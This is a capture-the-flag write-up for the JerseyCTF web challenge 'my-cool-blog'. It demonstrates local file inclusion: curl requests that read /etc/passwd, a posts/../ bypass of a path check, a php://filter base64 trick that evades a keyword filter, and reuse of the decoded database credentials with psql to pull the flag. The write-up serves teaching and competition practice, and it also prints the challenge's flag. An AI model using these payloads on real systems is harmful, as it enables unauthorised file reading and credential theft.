# my-cool-blog — JerseyCTF Writeup

**Challenge:** my-cool-blog  
**Category:** web  
**Difficulty:** Medium  
**Points:** 727  
**Solves:** 38  
**Author:** Noah Jacobson  
**Flag:** `jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}`

---

## Description

> Check out my new, cool blog!

---

## Background Knowledge (Read This First!)

### What is Local File Inclusion (LFI)?

**Local File Inclusion** is a vulnerability where user input is used directly in a file path without proper sanitization. When a web application reads and returns the content of a file specified by the user, an attacker can use `../` sequences to traverse the filesystem and read arbitrary files.

Example:
```
?file=../../../etc/passwd
```

### What is a PHP Filter Wrapper?

PHP supports **stream wrappers** — special URI schemes that transform data on the fly. The `php://filter` wrapper lets you apply transformations to a file before it is returned:

```
php://filter/convert.base64-encode/resource=path/to/file
```

This reads the file and returns its content **base64-encoded**. Any string-based content filter checking the raw output will be bypassed because the sensitive keyword never appears literally in the response.

### What is pg_connect?

`pg_connect()` is a PHP function for connecting to a PostgreSQL database. It typically appears in config files with credentials embedded:

```php
$db = pg_connect('host=... dbname=... user=... password=...');
```

---

## Solution — Step by Step

### Step 1 — Identify the LFI

The blog has posts with links like `/view-post.php?file=posts/cool-post-1`. The `file=` parameter immediately signals LFI. Testing it:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl "http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ubuntu:x:1000:1000::/home/ubuntu:/bin/sh
```

LFI confirmed. Error messages reveal the server root: `/opt/server/`.

### Step 2 — Read the PHP Source Code

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl "http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=posts/../view-post.php"
```

Source code revealed:

```php
$filename = $_GET['file'];

if (str_starts_with($filename, 'includes')) {
  echo 'Error: Access to includes directory disallowed.';
} else {
  $post_raw = file_get_contents($filename);

  if (str_contains($post_raw, base64_decode('cGdfY29ubmVjdA=='))) {
    echo 'Error: File contains sensitive information (pg connect function).';
  } else {
    echo $post_raw;
  }
}
```

Key findings:
1. The `includes/` directory is blocked — but only if the path **starts with** `includes`. Prefixing with `posts/../` bypasses this.
2. Files containing `pg_connect` are blocked from display.

### Step 3 — Confirm the Database Config Exists

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl "http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=posts/../includes/db.inc"
Error: File contains sensitive information (pg connect function).
```

The file exists but is blocked because it contains `pg_connect`.

### Step 4 — Bypass with PHP Filter Wrapper

The `pg_connect` check reads the raw file and searches for the string. Using PHP's base64 filter returns the file **encoded** — the literal string `pg_connect` never appears in the output:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl "http://my-cool-blog.aws.jerseyctf.com/view-post.php?file=php://filter/convert.base64-encode/resource=includes/db.inc"
PD9waHAKJGRiID0gcGdfY29ubmVjdCgnaG9zdD1teS1jb29sLWJsb2cuYXdzLmplcnNleWN0Zi5j...
```

### Step 5 — Decode the Config

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ echo "PD9waHAKJGRiID0gcGdfY29ubmVjdCgnaG9zdD1teS1jb29sLWJsb2cuYXdzLmplcnNleWN0Zi5jb20gZGJuYW1lPWJsb2cgdXNlcj1ibG9nX3dlYiBwYXNzd29yZD1vUFBOUTl2a01kQUp4JykK" | base64 -d
<?php
$db = pg_connect('host=my-cool-blog.aws.jerseyctf.com dbname=blog user=blog_web password=oPPNQ9vkMdAJx')
    or die('Could not connect: ' . pg_last_error());
```

Credentials extracted:
- **Host:** `my-cool-blog.aws.jerseyctf.com`
- **Database:** `blog`
- **User:** `blog_web`
- **Password:** `oPPNQ9vkMdAJx`

### Step 6 — Query the Database

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ psql "host=my-cool-blog.aws.jerseyctf.com dbname=blog user=blog_web password=oPPNQ9vkMdAJx" -c "SELECT * FROM flag;"
                  flag
----------------------------------------
 jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}
(1 row)
```

---

## Flag

```
jctf{EgdbFYxQi4zmD5oovBpG7F5RJqRb7Tnd}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `curl` | Test LFI and retrieve file contents | ⭐ Easy |
| PHP `php://filter` wrapper | Bypass the pg_connect string filter | ⭐⭐ Medium |
| `base64 -d` | Decode the database config | ⭐ Easy |
| `psql` | Connect directly to PostgreSQL and query the flag | ⭐ Easy |

---

## Key Takeaways

- **LFI + PHP filter wrappers = powerful combo.** The `php://filter/convert.base64-encode/resource=` trick is a classic bypass for string-content filters on PHP apps.
- **`str_starts_with` is not a complete path guard.** Prefixing with `posts/../` bypasses a starts-with check on `includes`.
- **Database credentials in source code are a critical finding.** Once the config file is readable, direct database access is usually possible.
- **The flag table is `flag`, not `flags`.** Always run `\dt` to list actual table names before querying.
- **Use `-c` for quick psql queries.** The server had aggressive idle session timeouts — running the query immediately avoids being disconnected.
